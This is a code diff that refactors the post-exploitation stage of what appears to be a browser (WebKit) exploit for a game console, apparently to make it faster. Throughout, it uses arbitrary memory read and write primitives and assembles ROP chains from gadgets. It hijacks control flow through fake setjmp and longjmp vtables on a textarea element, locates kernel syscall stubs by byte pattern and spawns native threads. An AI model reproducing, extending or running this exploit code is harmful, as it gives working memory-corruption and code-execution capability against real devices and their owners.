@@ -11,9 +11,10 @@ var stagegold = function () {
     // Cache the gadget names array 
     var gadgetNames = Object.keys(gadgetcache);
     var len = gadgetNames.length;
+    var webKitBaseRef = webKitBase; // Cache reference
     for (var i = 0; i < len; i++) {
         var gadgetname = gadgetNames[i];
-        window.gadgets[gadgetname] = webKitBase.add32(gadgetcache[gadgetname]);
+        window.gadgets[gadgetname] = webKitBaseRef.add32(gadgetcache[gadgetname]);
     }
 
     var o2wk = function (o) {
@@ -27,29 +28,38 @@ var stagegold = function () {
 
     p.malloc = function malloc(sz) {
         var backing = new Uint8Array(sz);
-        window.nogc.push(backing);
-        var ptr = p.read8(p.leakval(backing).add32(0x10));
+        nogcArray.push(backing);
+        var ptr = pRead8Cached(pLeakval(backing).add32(0x10));
         ptr.backing = backing;
         return ptr;
     }
 
+    // Cache window.nogc reference for faster access
+    var nogcArray = window.nogc;
+    var pLeakval = p.leakval.bind(p);
+    var pRead8Cached = p.read8.bind(p);
+    
     p.malloc32 = function malloc32(sz) {
         var backing = new Uint8Array(sz << 2); // Bitshift instead of multiplication
-        window.nogc.push(backing);
-        var ptr = p.read8(p.leakval(backing).add32(0x10));
+        nogcArray.push(backing);
+        var ptr = pRead8Cached(pLeakval(backing).add32(0x10));
         ptr.backing = new Uint32Array(backing.buffer);
         return ptr;
     }
     
+    // Cache write functions for better performance
+    var pWrite8 = p.write8.bind(p);
+    var pWrite4 = p.write4.bind(p);
+    
     p.arrayFromAddress = function (addr) {
         var arr_i = new Uint32Array(0x1000);
-        var leakVal = p.leakval(arr_i);
+        var leakVal = pLeakval(arr_i);
         var arr_ii = leakVal.add32(0x10);
 
-        p.write8(arr_ii, addr);
-        p.write4(arr_ii.add32(8), 0x40000);
+        pWrite8(arr_ii, addr);
+        pWrite4(arr_ii.add32(8), 0x40000);
 
-        nogc.push(arr_i);
+        nogcArray.push(arr_i);
         return arr_i;
     }
 
@@ -70,9 +80,10 @@ var stagegold = function () {
 
     var applyConfigs = function(vtable, configs) {
         var len = configs.length;
+        var vtableRef = vtable; // Cache vtable reference
         for (var i = 0; i < len; i++) {
             var config = configs[i];
-            p.write8(vtable.add32(config.offset), config.value);
+            p.write8(vtableRef.add32(config.offset), config.value);
         }
     };
 
@@ -97,21 +108,25 @@ var stagegold = function () {
     applyConfigs(longjmpFakeVtable, longjmpConfigs);
 
     var launch_chain = function (chain) {
-        var gadgets = window.gadgets;
+        var gadgetsRef = cachedGadgets; // Use pre-cached gadgets
         var originalContextPtr = original_context;
         var modifiedContextPtr = modified_context;
         
-        chain.push(gadgets["pop rdi"]);
+        // Cache frequently used gadgets
+        var popRdiRef = gadgetsRef["pop rdi"];
+        var retRef = gadgetsRef["ret"];
+        
+        chain.push(popRdiRef);
         chain.push(originalContextPtr);
         chain.push(libSceLibcInternalBase.add32(longJmpOffset));
 
-        p.write8(textAreaVtPtr, setjmpFakeVtable);
+        pWrite8(textAreaVtPtr, setjmpFakeVtable);
         textArea.scrollLeft = 0;
         
-        p.write8(modifiedContextPtr.add32(0x00), gadgets["ret"]);
-        p.write8(modifiedContextPtr.add32(0x10), chain.stack);
+        pWrite8(modifiedContextPtr.add32(0x00), retRef);
+        pWrite8(modifiedContextPtr.add32(0x10), chain.stack);
 
-        p.write8(textAreaVtPtr, longjmpFakeVtable);
+        pWrite8(textAreaVtPtr, longjmpFakeVtable);
         textArea.scrollLeft = 0;
     }
 
@@ -152,23 +167,33 @@ var stagegold = function () {
     var dview32 = new Uint32Array(1);
     var dview8 = new Uint8Array(dview32.buffer);
     
-    // Optimized syscall pattern matching with early exit conditions
+    // Optimized syscall pattern matching with cached constants and reduced checks
     var maxScan = countbytes - 11;
     var libKernelBaseRef = window.libKernelBase;
+    var syscallsRef = window.syscalls;
+    
+    // Cache pattern constants
+    var PATTERN_BYTE_0 = 0x48, PATTERN_BYTE_1 = 0xc7, PATTERN_BYTE_2 = 0xc0;
+    var PATTERN_BYTE_7 = 0x49, PATTERN_BYTE_8 = 0x89, PATTERN_BYTE_9 = 0xca;
+    var PATTERN_BYTE_10 = 0x0f, PATTERN_BYTE_11 = 0x05;
     
     for (var i = 0; i < maxScan; i++) {
-        // Primary pattern check first (most likely to fail)
-        if (kview[i] === 0x48 && kview[i + 1] === 0xc7 && kview[i + 2] === 0xc0) {
-            // Secondary pattern check only if primary passes
-            if (kview[i + 7] === 0x49 && kview[i + 8] === 0x89 && kview[i + 9] === 0xca && 
-                kview[i + 10] === 0x0f && kview[i + 11] === 0x05) {
-                
-                dview8[0] = kview[i + 3];
-                dview8[1] = kview[i + 4];
-                dview8[2] = kview[i + 5];
-                dview8[3] = kview[i + 6];
-                var syscallno = dview32[0];
-                window.syscalls[syscallno] = libKernelBaseRef.add32(i);
+        // Combine first three checks for better branch prediction
+        if (kview[i] === PATTERN_BYTE_0) {
+            if (kview[i + 1] === PATTERN_BYTE_1 && kview[i + 2] === PATTERN_BYTE_2) {
+                // Check remaining pattern bytes
+                if (kview[i + 7] === PATTERN_BYTE_7 && kview[i + 8] === PATTERN_BYTE_8 && 
+                    kview[i + 9] === PATTERN_BYTE_9 && kview[i + 10] === PATTERN_BYTE_10 && 
+                    kview[i + 11] === PATTERN_BYTE_11) {
+                    
+                    // Direct assignment instead of array access
+                    dview8[0] = kview[i + 3];
+                    dview8[1] = kview[i + 4];
+                    dview8[2] = kview[i + 5];
+                    dview8[3] = kview[i + 6];
+                    var syscallno = dview32[0];
+                    syscallsRef[syscallno] = libKernelBaseRef.add32(i);
+                }
             }
         }
     }
@@ -176,61 +201,92 @@ var stagegold = function () {
     var chain = new rop();
     var returnvalue;
 
-    // Cache frequently used gadgets 
+    // Cache frequently used gadgets and functions
     var cachedGadgets = window.gadgets;
     var popRdiGadget = cachedGadgets["pop rdi"];
     var movRaxGadget = cachedGadgets["mov [rdi], rax"];
+    var chainPush = chain.push.bind(chain); // Cache bound method
+    var chainRun = chain.run.bind(chain);
+    var pRead8 = p.read8.bind(p);
 
     p.fcall = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
         chain.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);
-        chain.push(popRdiGadget);
-        chain.push(chain.retval);
-        chain.push(movRaxGadget);
-        chain.run();
-        returnvalue = p.read8(chain.retval);
+        chainPush(popRdiGadget);
+        chainPush(chain.retval);
+        chainPush(movRaxGadget);
+        chainRun();
+        returnvalue = pRead8(chain.retval);
         return returnvalue;
     }
 
+    // Cache syscalls reference for faster access
+    var syscallsCache = window.syscalls;
+    var pFcall = p.fcall;
+    
     p.syscall = function (sysc, rdi, rsi, rdx, rcx, r8, r9) {
-        return p.fcall(window.syscalls[sysc], rdi, rsi, rdx, rcx, r8, r9);
+        return pFcall(syscallsCache[sysc], rdi, rsi, rdx, rcx, r8, r9);
     }
 
     p.stringify = function (str) {
         var len = str.length;
         var bufView = new Uint8Array(len + 1);
-        // Unroll small strings for better performance
-        if (len <= 8) {
-            for (var i = 0; i < len; i++) {
-                bufView[i] = str.charCodeAt(i) & 0xFF;
+        
+        // Optimized character code copying with reduced bit operations
+        if (len <= 16) {
+            // Unroll loop for small strings
+            switch(len) {
+                case 16: bufView[15] = str.charCodeAt(15);
+                case 15: bufView[14] = str.charCodeAt(14);
+                case 14: bufView[13] = str.charCodeAt(13);
+                case 13: bufView[12] = str.charCodeAt(12);
+                case 12: bufView[11] = str.charCodeAt(11);
+                case 11: bufView[10] = str.charCodeAt(10);
+                case 10: bufView[9] = str.charCodeAt(9);
+                case 9: bufView[8] = str.charCodeAt(8);
+                case 8: bufView[7] = str.charCodeAt(7);
+                case 7: bufView[6] = str.charCodeAt(6);
+                case 6: bufView[5] = str.charCodeAt(5);
+                case 5: bufView[4] = str.charCodeAt(4);
+                case 4: bufView[3] = str.charCodeAt(3);
+                case 3: bufView[2] = str.charCodeAt(2);
+                case 2: bufView[1] = str.charCodeAt(1);
+                case 1: bufView[0] = str.charCodeAt(0);
+                case 0: break;
             }
         } else {
+            // Use faster loop for longer strings
             for (var i = 0; i < len; i++) {
-                bufView[i] = str.charCodeAt(i) & 0xFF;
+                bufView[i] = str.charCodeAt(i);
             }
         }
         bufView[len] = 0;
-        window.nogc.push(bufView);
-        return p.read8(p.leakval(bufView).add32(0x10));
+        nogcArray.push(bufView);
+        return pRead8Cached(pLeakval(bufView).add32(0x10));
     };
 
     var spawn_thread = function (name, chaino) {
         var new_thr = new rop();
         var context = p.malloc(0x100);
-        var retGadget = window.gadgets["ret"];
+        var retGadget = cachedGadgets["ret"];
+        
+        // Cache context addresses for reuse
+        var contextBase = context;
+        var contextOffset10 = context.add32(0x10);
+        var contextOffset48 = context.add32(0x48);
 
-        p.write8(context.add32(0x0), retGadget);
-        p.write8(context.add32(0x10), new_thr.stack);
+        pWrite8(contextBase, retGadget);
+        pWrite8(contextOffset10, new_thr.stack);
         new_thr.push(retGadget);
         chaino(new_thr);
-        p.write8(context, retGadget);
-        p.write8(context.add32(0x10), new_thr.stack);
+        pWrite8(contextBase, retGadget);
+        pWrite8(contextOffset10, new_thr.stack);
 
         var retv = function () {
-            p.fcall(libKernelBase.add32(pthread_create_np_offset), context.add32(0x48), 0, 
-                   libSceLibcInternalBase.add32(longJmpOffset), context, p.stringify(name));
+            pFcall(libKernelBase.add32(pthread_create_np_offset), contextOffset48, 0, 
+                   libSceLibcInternalBase.add32(longJmpOffset), contextBase, p.stringify(name));
         }
-        window.nogc.push(new_thr);
-        window.nogc.push(context);
+        nogcArray.push(new_thr);
+        nogcArray.push(context);
 
         return retv;
     }
